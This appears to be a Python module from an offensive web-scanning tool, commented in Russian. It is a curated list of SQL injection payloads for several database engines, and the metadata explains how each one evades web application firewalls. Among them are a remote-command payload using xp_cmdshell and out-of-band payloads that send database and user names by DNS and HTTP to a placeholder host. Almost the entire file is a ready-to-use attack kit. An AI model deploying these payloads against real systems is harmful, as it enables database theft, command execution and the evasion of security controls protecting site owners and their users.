# core/sniper_payloads.py — curated sniper SQLi payloads with metadata
"""
40 отобранных payload'ов с метаданными:
  name      — уникальный идентификатор
  payload   — сама строка
  dbms      — mysql | mssql | postgres | oracle | sqlite | all
  type      — error | time | union | boolean | stacked | oob
  bypass    — что обходит (comment_space, version_tagged, encoded_ws, mixed_case)
  unique    — что уникального в этой технике (для отчёта)
"""

SNIPER_SQLI = [
    # ==================== ERROR-BASED (MySQL) ====================
    {
        "name": "mysql_double_query_error",
        "payload": "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "dbms": "mysql",
        "type": "error",
        "bypass": ["comment_space"],
        "unique": "double-query error — единственная MySQL-техника, дающая reliable error без прав",
    },
    {
        "name": "mysql_extractvalue",
        "payload": "'/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))-- -",
        "dbms": "mysql",
        "type": "error",
        "bypass": ["comment_space", "mixed_func"],
        "unique": "extractvalue возвращает value через ошибку XPATH syntax",
    },
    {
        "name": "mysql_updatexml",
        "payload": "'/**/AND/**/UPDATEXML(1,CONCAT(0x7e,user(),0x7e),1)-- -",
        "dbms": "mysql",
        "type": "error",
        "bypass": ["comment_space"],
        "unique": "updatexml работает на MySQL 5.1+, когда extractvalue заблокирован",
    },
    {
        "name": "mysql_json_keys",
        "payload": "'/**/AND/**/JSON_KEYS((SELECT database()))-- -",
        "dbms": "mysql",
        "type": "error",
        "bypass": ["comment_space", "uncommon_func"],
        "unique": "JSON_KEYS редко в WAF-сигнатурах, MySQL 5.7.9+",
    },
    {
        "name": "mysql_gtid_subset",
        "payload": "'/**/AND/**/GTID_SUBSET(SYSTEM_USER(),1)-- -",
        "dbms": "mysql",
        "type": "error",
        "bypass": ["comment_space", "uncommon_func"],
        "unique": "GTID_SUBSET — MySQL 5.7.6+, почти никогда не блокируется",
    },
    {
        "name": "mysql_exp_error",
        "payload": "'/**/AND/**/EXP(~(SELECT*FROM(SELECT database())a))-- -",
        "dbms": "mysql",
        "type": "error",
        "bypass": ["comment_space"],
        "unique": "EXP(~) даёт DOUBLE value out of range с inlined data",
    },

    # ==================== ERROR-BASED (другие DBMS) ====================
    {
        "name": "mssql_convert_version",
        "payload": "'/**/AND/**/1=CONVERT(int,(SELECT@@version))--",
        "dbms": "mssql",
        "type": "error",
        "bypass": ["comment_space"],
        "unique": "MSSQL ошибка Conversion failed с версией в тексте",
    },
    {
        "name": "pg_cast_error",
        "payload": "'/**/AND/**/1=CAST((SELECT version())AS int)--",
        "dbms": "postgres",
        "type": "error",
        "bypass": ["comment_space"],
        "unique": "PG invalid input syntax for integer",
    },
    {
        "name": "oracle_utl_inaddr",
        "payload": "'/**/AND/**/1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--",
        "dbms": "oracle",
        "type": "error",
        "bypass": ["comment_space"],
        "unique": "Oracle OOB через UTL_INADDR, работает при закрытом DNS",
    },

    # ==================== TIME-BASED ====================
    {
        "name": "mysql_sleep_nested",
        "payload": "'/**/AND/**/(SELECT 1 FROM(SELECT SLEEP(5))x)-- -",
        "dbms": "mysql",
        "type": "time",
        "bypass": ["comment_space", "nested"],
        "unique": "вложенный SELECT — обходит триггер на 'SLEEP('",
    },
    {
        "name": "mysql_case_sleep",
        "payload": "'/**/AND/**/CASE/**/WHEN/**/1=1/**/THEN/**/SLEEP(5)/**/ELSE/**/0/**/END-- -",
        "dbms": "mysql",
        "type": "time",
        "bypass": ["comment_space", "case_structure"],
        "unique": "CASE WHEN ломает WAF-правила, ищущие одиночный SLEEP",
    },
    {
        "name": "mysql_benchmark",
        "payload": "'/**/AND/**/BENCHMARK(10000000,MD5('a'))-- -",
        "dbms": "mysql",
        "type": "time",
        "bypass": ["comment_space"],
        "unique": "BENCHMARK работает, когда SLEEP заблокирован WAF",
    },
    {
        "name": "mysql_count_sleep",
        "payload": "'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.tables/**/WHERE/**/SLEEP(5)=0)-- -",
        "dbms": "mysql",
        "type": "time",
        "bypass": ["comment_space", "aggregate"],
        "unique": "COUNT с WHERE SLEEP — тяжёлый запрос, WAF не детектит время-инъекцию",
    },
    {
        "name": "mysql_heavy_query_time",
        "payload": "'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.columns/**/A,/**/information_schema.columns/**/B,/**/information_schema.columns/**/C)-- -",
        "dbms": "mysql",
        "type": "time",
        "bypass": ["comment_space"],
        "unique": "cartesian product — работает без SLEEP вообще, чистый CPU-burn",
    },
    {
        "name": "pg_sleep_inline",
        "payload": "'/**/AND/**/(SELECT/**/1/**/FROM/**/PG_SLEEP(5))--",
        "dbms": "postgres",
        "type": "time",
        "bypass": ["comment_space"],
        "unique": "PG_SLEEP через подзапрос — обходит триггер на прямом pg_sleep",
    },
    {
        "name": "mssql_waitfor",
        "payload": "';/**/WAITFOR/**/DELAY/**/'0:0:5'--",
        "dbms": "mssql",
        "type": "time",
        "bypass": ["comment_space"],
        "unique": "MSSQL WAITFOR — единственная time-based техника для MSSQL",
    },

    # ==================== UNION-BASED ====================
    {
        "name": "mysql_versioned_union",
        "payload": "'/*!50000UNION*//*!50000SELECT*/NULL,NULL,NULL-- -",
        "dbms": "mysql",
        "type": "union",
        "bypass": ["version_tagged_comment"],
        "unique": "MySQL version-tagged comment — ModSecurity и Cloudflare часто пропускают",
    },
    {
        "name": "union_comment_space",
        "payload": "'/**/UNION/**/SELECT/**/NULL,NULL,NULL-- -",
        "dbms": "all",
        "type": "union",
        "bypass": ["comment_space"],
        "unique": "comment вместо пробелов — ломает regex-сигнатуры WAF",
    },
    {
        "name": "union_newline",
        "payload": "'%0aUNION%0aSELECT%0aNULL,NULL,NULL-- -",
        "dbms": "all",
        "type": "union",
        "bypass": ["encoded_ws"],
        "unique": "newline вместо пробела — WAF видит одну строку, БД — две",
    },
    {
        "name": "union_tab_encoded",
        "payload": "'%09UNION%09SELECT%09NULL,NULL,NULL-- -",
        "dbms": "all",
        "type": "union",
        "bypass": ["encoded_ws"],
        "unique": "tab-encoded — работает, когда newline заблокирован",
    },
    {
        "name": "union_double_encoded",
        "payload": "'%2520UNION%2520SELECT%2520NULL,NULL,NULL-- -",
        "dbms": "all",
        "type": "union",
        "bypass": ["double_encoding"],
        "unique": "double-encoding: WAF декодирует один раз, БД — дважды",
    },
    {
        "name": "union_parenthesized",
        "payload": "'/**/UNION(SELECT(NULL,NULL,NULL))-- -",
        "dbms": "mysql",
        "type": "union",
        "bypass": ["comment_space", "paren_wrap"],
        "unique": "скобки вокруг SELECT — обходят WAF, ищущие ' UNION SELECT '",
    },
    {
        "name": "union_all_select",
        "payload": "'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL,NULL-- -",
        "dbms": "all",
        "type": "union",
        "bypass": ["comment_space", "all_keyword"],
        "unique": "UNION ALL вместо UNION — меняет fingerprint",
    },
    {
        "name": "union_distinct",
        "payload": "'/**/UNION/**/DISTINCT/**/SELECT/**/NULL,NULL,NULL-- -",
        "dbms": "all",
        "type": "union",
        "bypass": ["comment_space", "distinct_keyword"],
        "unique": "UNION DISTINCT — редкий variant, проходит там, где ALL блокируется",
    },
    {
        "name": "union_mixed_case",
        "payload": "'/**/UnIoN/**/SeLeCt/**/NULL,NULL,NULL-- -",
        "dbms": "all",
        "type": "union",
        "bypass": ["comment_space", "mixed_case"],
        "unique": "mixed-case ломает регистрозависимые WAF-правила",
    },

    # ==================== BOOLEAN-BASED ====================
    {
        "name": "bool_length",
        "payload": "'/**/AND/**/LENGTH(database())>5-- -",
        "dbms": "all",
        "type": "boolean",
        "bypass": ["comment_space"],
        "unique": "простая boolean-инъекция для diff-анализа ответа",
    },
    {
        "name": "bool_ascii",
        "payload": "'/**/AND/**/ASCII(SUBSTRING((SELECT user()),1,1))>100-- -",
        "dbms": "all",
        "type": "boolean",
        "bypass": ["comment_space"],
        "unique": "бинарный поиск через ASCII — база для extraction",
    },
    {
        "name": "bool_hex",
        "payload": "'/**/AND/**/HEX(SUBSTRING(database(),1,1))>0x40-- -",
        "dbms": "mysql",
        "type": "boolean",
        "bypass": ["comment_space"],
        "unique": "HEX-сравнение — обходит символьные фильтры",
    },
    {
        "name": "bool_regexp",
        "payload": "'/**/AND/**/'a'/**/REGEXP/**/'a'-- -",
        "dbms": "mysql",
        "type": "boolean",
        "bypass": ["comment_space", "regexp_func"],
        "unique": "REGEXP — редко в сигнатурах WAF",
    },

    # ==================== STACKED ====================
    {
        "name": "stacked_select",
        "payload": "';/**/SELECT/**/1--",
        "dbms": "mysql",
        "type": "stacked",
        "bypass": ["comment_space"],
        "unique": "простой stacked — проверить поддержку мультистейтмента",
    },
    {
        "name": "stacked_mssql_rce",
        "payload": "';/**/EXEC/**/xp_cmdshell/**/'whoami'--",
        "dbms": "mssql",
        "type": "stacked",
        "bypass": ["comment_space"],
        "unique": "xp_cmdshell — прямая RCE на MSSQL с правами sa",
    },
    {
        "name": "stacked_pg_sleep",
        "payload": "';/**/SELECT/**/PG_SLEEP(5)--",
        "dbms": "postgres",
        "type": "stacked",
        "bypass": ["comment_space"],
        "unique": "PG stacked query с задержкой",
    },

    # ==================== OUT-OF-BAND ====================
    {
        "name": "mysql_loadfile_dns",
        "payload": "';/**/SELECT/**/LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.OOB_HOST\\\\a'))--",
        "dbms": "mysql",
        "type": "oob",
        "bypass": ["comment_space"],
        "unique": "DNS-exfil через LOAD_FILE — работает слепую инъекцию без времени",
    },
    {
        "name": "mssql_xp_dirtree_dns",
        "payload": "';/**/DECLARE/**/@q/**/VARCHAR(99);SET/**/@q='\\\\\\\\'+(SELECT@@version)+'.OOB_HOST\\\\a';EXEC/**/master.dbo.xp_dirtree/**/@q--",
        "dbms": "mssql",
        "type": "oob",
        "bypass": ["comment_space"],
        "unique": "MSSQL OOB через xp_dirtree — версия в DNS",
    },
    {
        "name": "oracle_utl_http_oob",
        "payload": "'/**/AND/**/1=(SELECT/**/UTL_HTTP.REQUEST('http://OOB_HOST/'||(SELECT/**/user/**/FROM/**/dual)/**/FROM/**/dual)--",
        "dbms": "oracle",
        "type": "oob",
        "bypass": ["comment_space"],
        "unique": "Oracle UTL_HTTP — реальный OOB-запрос",
    },

    # ==================== SECOND-ORDER / UNIQUE ====================
    {
        "name": "second_order_sleep",
        "payload": "admin'/**/AND/**/(SELECT/**/1/**/FROM(SELECT/**/SLEEP(5))x)/**/AND/**/'1'='1",
        "dbms": "mysql",
        "type": "second_order",
        "bypass": ["comment_space"],
        "unique": "second-order — payload сбалансирован, срабатывает при следующем запросе",
    },
    {
        "name": "chunked_union",
        "payload": "'+UNION+SELECT+NULL,NULL,NULL--",
        "dbms": "all",
        "type": "union",
        "bypass": ["plus_space"],
        "unique": "+ вместо пробела — URL-encoded space, иногда проходит там где /**/ блокируется",
    },
    {
        "name": "sqlite_union_cast",
        "payload": "'/**/UNION/**/SELECT/**/CAST(NULL AS INT),NULL,NULL--",
        "dbms": "sqlite",
        "type": "union",
        "bypass": ["comment_space"],
        "unique": "SQLite CAST — точное число колонок через типы",
    },
    {
        "name": "mysql_having_error",
        "payload": "'/**/GROUP/**/BY/**/1/**/HAVING/**/1=1-- -",
        "dbms": "mysql",
        "type": "error",
        "bypass": ["comment_space", "having_clause"],
        "unique": "GROUP BY + HAVING — обходит WAF, не ищущие этот паттерн",
    },
    {
        "name": "mysql_order_by_count",
        "payload": "'/**/ORDER/**/BY/**/100-- -",
        "dbms": "mysql",
        "type": "error",
        "bypass": ["comment_space"],
        "unique": "ORDER BY 100 — детект числа колонок через ошибку",
    },
]


def by_dbms(dbms):
    """Filter by target DBMS."""
    return [p for p in SNIPER_SQLI if p["dbms"] in (dbms, "all")]


def by_type(ptype):
    """Filter by attack type."""
    return [p for p in SNIPER_SQLI if p["type"] == ptype]


def by_waf_bypass():
    """Filter by WAF-evasive payloads."""
    return [p for p in SNIPER_SQLI if p["bypass"]]


def payload_strings(probes=None):
    """Return just payload strings."""
    probes = probes or SNIPER_SQLI
    return [p["payload"] for p in probes]


# Группировка для быстрого overview
GROUPS = {
    "error_mysql":   [p for p in SNIPER_SQLI if p["type"] == "error" and p["dbms"] == "mysql"],
    "error_other":   [p for p in SNIPER_SQLI if p["type"] == "error" and p["dbms"] != "mysql"],
    "time":          [p for p in SNIPER_SQLI if p["type"] == "time"],
    "union":         [p for p in SNIPER_SQLI if p["type"] == "union"],
    "boolean":       [p for p in SNIPER_SQLI if p["type"] == "boolean"],
    "stacked":       [p for p in SNIPER_SQLI if p["type"] == "stacked"],
    "oob":           [p for p in SNIPER_SQLI if p["type"] == "oob"],
    "second_order":  [p for p in SNIPER_SQLI if p["type"] == "second_order"],
}


if __name__ == "__main__":
    print(f"Total probes: {len(SNIPER_SQLI)}\n")
    for group, probes in GROUPS.items():
        print(f"  {group:15s}: {len(probes)}")
    print()
    print("Sample payloads:")
    for p in SNIPER_SQLI[:3]:
        print(f"  [{p['name']}] {p['payload'][:70]}...")
